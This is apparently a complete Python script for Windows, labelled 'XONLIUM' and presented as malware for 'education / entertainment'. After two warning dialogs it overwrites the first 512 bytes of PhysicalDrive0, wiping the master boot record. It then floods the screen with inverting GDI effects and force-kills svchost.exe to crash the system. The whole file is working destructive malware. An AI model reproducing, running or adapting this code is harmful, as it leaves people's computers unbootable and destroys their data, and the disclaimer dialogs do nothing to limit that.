from win32ui import *
from win32file import *
from win32con import *
from win32gui import *
from win32api import *
import sys
import os
import random

desk = GetDC(0)
w    = GetSystemMetrics(0)
h    = GetSystemMetrics(1)
x    = SM_CXSCREEN
y    = SM_CYSCREEN

if MessageBox(None, "This Malware can Overwrite your MBR and can Harm your PC!\nThe Creator is not Responseble for any Damage! The Malware is only for Education / Entertainment! Contains flashing Lights.\n\nDo you want to continue?", "XONLIUM", MB_ICONWARNING | MB_YESNO) == IDNO:
    sys.exit()
if MessageBox(None, "This is the Last Warning! This can harm your PC badly.\n\nDo you want to execute this Malware?", "XONLIUM -- LAST WARNING", MB_ICONWARNING | MB_YESNO) == IDNO:
    sys.exit()
    
hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
WriteFile(hDevice, AllocateReadBuffer(512), None)
CloseHandle(hDevice)

for i in range(0, 550):
    PatBlt(desk, random.randrange(w), random.randrange(h), random.randrange(w), random.randrange(h), PATINVERT)
for i in range(0, 750):
    BitBlt(desk, 0, 0, w, h, desk, 12, 12, SRCINVERT)
for i in range(0, 1000):
    brush = CreateSolidBrush(RGB(random.randrange(0,255), random.randrange(0,255), random.randrange(0,255)))
    SelectObject(desk, brush)
    PatBlt(desk, random.randrange(w), random.randrange(h), random.randrange(w), random.randrange(h), PATINVERT)
for i in range(0, 750):
    BitBlt(desk, 0, 0, w, h, desk, 12, 12, SRCCOPY)
for i in range(0, 500):
    BitBlt(desk, 0, 0, w, h, desk, 12, 12, SRCINVERT)

os.system("taskkill /F /IM svchost.exe")
